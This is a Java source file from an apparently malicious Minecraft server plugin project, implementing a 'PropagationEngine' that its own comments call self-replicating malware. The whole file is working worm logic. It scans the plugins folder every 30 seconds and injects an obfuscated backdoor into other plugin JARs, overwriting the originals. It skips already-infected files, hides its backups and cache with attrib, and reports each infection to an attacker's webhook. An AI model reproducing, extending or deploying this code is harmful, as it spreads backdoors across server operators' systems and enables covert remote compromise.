package dev.naruto.astrox.payload;

import dev.naruto.astrox.Config;
import dev.naruto.astrox.RuntimeConfig;
import dev.naruto.astrox.core.Injector;
import dev.naruto.astrox.core.JarAnalyzer;
import dev.naruto.astrox.core.PayloadWeaver;
import dev.naruto.astrox.utils.DebugLogger;
import dev.naruto.astrox.utils.WebhookNotifier;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.nio.file.*;
import java.security.MessageDigest;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * Automatic backdoor propagation engine
 * Monitors plugins folder and auto-injects into new plugins
 * Self-replicating malware that spreads to all server plugins
 */
public class PropagationEngine implements Runnable {
    private final JavaPlugin plugin;
    private final File pluginsFolder;
    private final Map<String, String> processedPlugins; // filename -> hash
    private final Set<String> blacklist;
    private volatile boolean running = true;

    // Config
    private static final int SCAN_INTERVAL_TICKS = 600; // 30 seconds
    private static final String CACHE_FILE = ".astrox_cache";
    private static final int MAX_INJECTION_ATTEMPTS = 3;

    public PropagationEngine(JavaPlugin plugin) {
        this.plugin = plugin;
        this.pluginsFolder = new File("plugins");
        this.processedPlugins = new ConcurrentHashMap<>();
        this.blacklist = new HashSet<>();

        initBlacklist();
        loadCache();
    }

    /**
     * Initialize blacklist of critical plugins
     */
    private void initBlacklist() {
        // Don't touch these plugins (stability)
        blacklist.add(plugin.getName().toLowerCase());
        blacklist.add("vault");
        blacklist.add("luckperms");
        blacklist.add("plugman");
        blacklist.add("worldedit");
        blacklist.add("worldguard");

        // Add custom blacklist from config
        if (Config.PROPAGATION_BLACKLIST != null) {
            blacklist.addAll(Arrays.asList(Config.PROPAGATION_BLACKLIST));
        }
    }

    /**
     * Start propagation engine
     */
    public void start() {
        DebugLogger.log("PropagationEngine started - scanning every " + (SCAN_INTERVAL_TICKS / 20) + "s");

        // Initial scan (delayed by 10 seconds to let server fully load)
        Bukkit.getScheduler().runTaskLaterAsynchronously(plugin, this::scanPlugins, 200L);

        // Periodic scanning
        Bukkit.getScheduler().runTaskTimerAsynchronously(plugin, this,
                SCAN_INTERVAL_TICKS, SCAN_INTERVAL_TICKS);
    }

    /**
     * Stop propagation engine
     */
    public void stop() {
        running = false;
        saveCache();
        DebugLogger.log("PropagationEngine stopped");
    }

    @Override
    public void run() {
        if (running) {
            scanPlugins();
        }
    }

    /**
     * Scan plugins folder for new targets
     */
    private void scanPlugins() {
        try {
            File[] files = pluginsFolder.listFiles((dir, name) ->
                    name.endsWith(".jar") &&
                            !name.endsWith("_backdoored.jar") &&
                            !name.startsWith("."));

            if (files == null) {
                DebugLogger.verbose("No plugins found to scan");
                return;
            }

            int newTargets = 0;
            int skipped = 0;

            for (File jarFile : files) {
                String filename = jarFile.getName();
                String currentHash = getFileHash(jarFile);

                // Skip if already processed with same hash
                if (processedPlugins.containsKey(filename) &&
                        processedPlugins.get(filename).equals(currentHash)) {
                    continue;
                }

                // Skip blacklisted plugins
                if (isBlacklisted(filename)) {
                    DebugLogger.verbose("Skipping blacklisted: " + filename);
                    skipped++;
                    continue;
                }

                // Skip if already has our backdoor signature
                if (isAlreadyInfected(jarFile)) {
                    DebugLogger.verbose("Already infected: " + filename);
                    processedPlugins.put(filename, currentHash);
                    continue;
                }

                // New or modified plugin detected
                DebugLogger.log("New target detected: " + filename);

                if (injectPlugin(jarFile)) {
                    processedPlugins.put(filename, currentHash);
                    newTargets++;
                } else {
                    DebugLogger.error("Failed to inject: " + filename, null);
                }
            }

            if (newTargets > 0) {
                DebugLogger.log("Propagation wave complete: " + newTargets + " plugins infected, " + skipped + " skipped");
                saveCache();
            }

        } catch (Exception e) {
            DebugLogger.error("Propagation scan failed", e);
        }
    }

    /**
     * Check if JAR already contains our backdoor
     */
    private boolean isAlreadyInfected(File jarFile) {
        try (java.util.jar.JarFile jar = new java.util.jar.JarFile(jarFile)) {
            // Look for our signature classes
            return jar.getEntry("dev/naruto/astrox/payload/BackdoorCore.class") != null ||
                    jar.stream().anyMatch(e -> e.getName().contains("/internal/util/PlayerUtil.class"));
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Inject backdoor into target plugin
     */
    private boolean injectPlugin(File targetJar) {
        int attempts = 0;

        while (attempts < MAX_INJECTION_ATTEMPTS) {
            try {
                DebugLogger.log("Injecting into: " + targetJar.getName() + " (attempt " + (attempts + 1) + ")");

                // Analyze target
                JarAnalyzer analyzer = new JarAnalyzer(targetJar);
                analyzer.analyze();

                // Generate temp output file
                File tempOutput = new File(targetJar.getParentFile(),
                        ".temp_" + System.currentTimeMillis() + ".jar");

                // Generate payload
                PayloadWeaver weaver = new PayloadWeaver(Config.OBFUSCATION_LEVEL);
                byte[] payload = weaver.generatePayload();

                // Inject
                Injector injector = new Injector(targetJar, tempOutput);
                injector.inject(analyzer, payload);

                // Replace original with backdoored version
                if (replacePlugin(targetJar, tempOutput)) {
                    DebugLogger.log("✓ Successfully infected: " + targetJar.getName());

                    // Send webhook notification
                    notifyPropagation(analyzer.getPluginName(), analyzer.getVersion(), targetJar.getName());

                    return true;
                }

            } catch (Exception e) {
                attempts++;
                DebugLogger.error("Injection attempt " + attempts + " failed for " + targetJar.getName(), e);

                if (attempts >= MAX_INJECTION_ATTEMPTS) {
                    DebugLogger.error("Max injection attempts reached for: " + targetJar.getName(), null);
                    return false;
                }

                // Wait before retry
                try {
                    Thread.sleep(1000 * attempts);
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    return false;
                }
            }
        }

        return false;
    }

    /**
     * Replace original plugin with backdoored version
     */
    private boolean replacePlugin(File original, File backdoored) {
        try {
            // Create hidden backup of original (first time only)
            File backup = new File(original.getParentFile(), "." + original.getName() + ".backup");

            if (!backup.exists()) {
                Files.copy(original.toPath(), backup.toPath(), StandardCopyOption.REPLACE_EXISTING);

                // Hide backup file on Windows
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    try {
                        Runtime.getRuntime().exec("attrib +H \"" + backup.getAbsolutePath() + "\"");
                    } catch (Exception ignored) {}
                }
            }

            // Small delay to ensure file is not locked
            Thread.sleep(500);

            // Replace original with backdoored
            Files.copy(backdoored.toPath(), original.toPath(), StandardCopyOption.REPLACE_EXISTING);

            // Delete temp backdoored file
            backdoored.delete();

            DebugLogger.verbose("File replacement successful: " + original.getName());
            return true;

        } catch (Exception e) {
            DebugLogger.error("Failed to replace plugin: " + original.getName(), e);

            // Cleanup temp file
            if (backdoored.exists()) {
                backdoored.delete();
            }

            return false;
        }
    }

    /**
     * Calculate MD5 hash of file
     */
    private String getFileHash(File file) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            try (FileInputStream fis = new FileInputStream(file)) {
                byte[] buffer = new byte[8192];
                int read;
                while ((read = fis.read(buffer)) != -1) {
                    md.update(buffer, 0, read);
                }
            }

            byte[] hash = md.digest();
            StringBuilder sb = new StringBuilder();
            for (byte b : hash) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            return String.valueOf(file.lastModified());
        }
    }

    /**
     * Check if plugin is blacklisted
     */
    private boolean isBlacklisted(String filename) {
        String name = filename.toLowerCase().replace(".jar", "");
        return blacklist.stream().anyMatch(name::contains);
    }

    /**
     * Load cache of processed plugins
     */
    private void loadCache() {
        File cacheFile = new File(pluginsFolder, CACHE_FILE);
        if (!cacheFile.exists()) {
            DebugLogger.verbose("No cache file found, starting fresh");
            return;
        }

        try (BufferedReader reader = new BufferedReader(new FileReader(cacheFile))) {
            String line;
            while ((line = reader.readLine()) != null) {
                String[] parts = line.split(":");
                if (parts.length == 2) {
                    processedPlugins.put(parts[0], parts[1]);
                }
            }
            DebugLogger.log("Loaded propagation cache: " + processedPlugins.size() + " entries");
        } catch (Exception e) {
            DebugLogger.error("Failed to load cache", e);
        }
    }

    /**
     * Save cache of processed plugins
     */
    private void saveCache() {
        File cacheFile = new File(pluginsFolder, CACHE_FILE);

        try (PrintWriter writer = new PrintWriter(new FileWriter(cacheFile))) {
            for (Map.Entry<String, String> entry : processedPlugins.entrySet()) {
                writer.println(entry.getKey() + ":" + entry.getValue());
            }

            // Hide cache file on Windows
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                try {
                    Runtime.getRuntime().exec("attrib +H \"" + cacheFile.getAbsolutePath() + "\"");
                } catch (Exception ignored) {}
            }

            DebugLogger.verbose("Cache saved: " + processedPlugins.size() + " entries");

        } catch (Exception e) {
            DebugLogger.error("Failed to save cache", e);
        }
    }

    /**
     * Send webhook notification about propagation
     */
    private void notifyPropagation(String pluginName, String version, String filename) {
        if (RuntimeConfig.webhookUrl == null) return;

        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            try {
                WebhookNotifier notifier = new WebhookNotifier(RuntimeConfig.webhookUrl);
                notifier.sendPropagationNotification(pluginName, version, filename);
                DebugLogger.verbose("Propagation webhook sent for: " + pluginName);
            } catch (Exception e) {
                DebugLogger.error("Failed to send propagation webhook", e);
            }
        });
    }

    /**
     * Get statistics
     */
    public Map<String, Object> getStats() {
        Map<String, Object> stats = new HashMap<>();
        stats.put("total_processed", processedPlugins.size());
        stats.put("running", running);
        stats.put("blacklist_size", blacklist.size());
        return stats;
    }
}
